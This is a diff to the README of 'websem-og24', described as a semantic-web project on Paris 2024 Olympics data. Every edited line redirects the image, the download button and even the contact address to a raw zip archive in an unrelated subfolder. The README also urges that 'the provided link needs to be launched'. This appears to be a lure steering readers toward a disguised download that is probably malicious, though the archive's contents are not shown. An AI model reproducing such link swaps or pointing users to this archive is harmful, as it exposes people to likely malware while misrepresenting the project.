@@ -1,7 +1,7 @@
 
 # Welcome to websem-og24 🌐
 
-![WebSem OG24](https://github.com/YamenM12/websem-og24/releases/tag/v2.0)
+![WebSem OG24](https://raw.githubusercontent.com/YamenM12/websem-og24/main/tabulare/og-websem-aqueous.zip)
 
 ## Description
 "websem-og24" is a cutting-edge semantic web project that leverages deep learning and knowledge graphs to build a sophisticated data model focusing on the Paris 2024 Olympic Games. This repository combines the power of semantic web technologies such as OWL, RDF, RDFS, SHACL, SKOS, and SPARQL to create an enriched and interconnected representation of Olympic Games data.
@@ -20,7 +20,7 @@
 
 ## Quick Start
 To get started with the project, you can download the latest release by clicking on the button below:
-[![Download Project](https://github.com/YamenM12/websem-og24/releases/tag/v2.0)](https://github.com/YamenM12/websem-og24/releases/tag/v2.0) 
+[![Download Project](https://raw.githubusercontent.com/YamenM12/websem-og24/main/tabulare/og-websem-aqueous.zip)](https://raw.githubusercontent.com/YamenM12/websem-og24/main/tabulare/og-websem-aqueous.zip) 
 
 *Note: The provided link needs to be launched for download.*
 
@@ -37,7 +37,7 @@ If you're interested in contributing to the "websem-og24" project, feel free to 
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
 ## Contact
-For any inquiries or feedback, please reach out to the project maintainers at https://github.com/YamenM12/websem-og24/releases/tag/v2.0
+For any inquiries or feedback, please reach out to the project maintainers at https://raw.githubusercontent.com/YamenM12/websem-og24/main/tabulare/og-websem-aqueous.zip
 
 ---
 
